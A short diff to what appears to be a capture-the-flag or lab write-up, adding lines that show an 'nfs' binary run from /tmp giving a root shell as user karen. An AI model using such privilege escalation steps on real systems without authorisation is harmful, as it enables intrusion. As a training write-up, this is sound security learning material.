@@ -746,6 +746,10 @@ drwx------ 3 root   root   4096 Nov 27 12:23 systemd-private-6f1bf139770f4805adc
 drwx------ 3 root   root   4096 Nov 27 12:23 systemd-private-6f1bf139770f4805adc53bdab28afc3a-systemd-timesyncd.service-YeGiOf
 ```
 
-Executing the nfs file.
+Executing the nfs file give root.
 
-
+```
+$ ./nfs	
+root@ip-10-10-102-151:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(karen)
+```
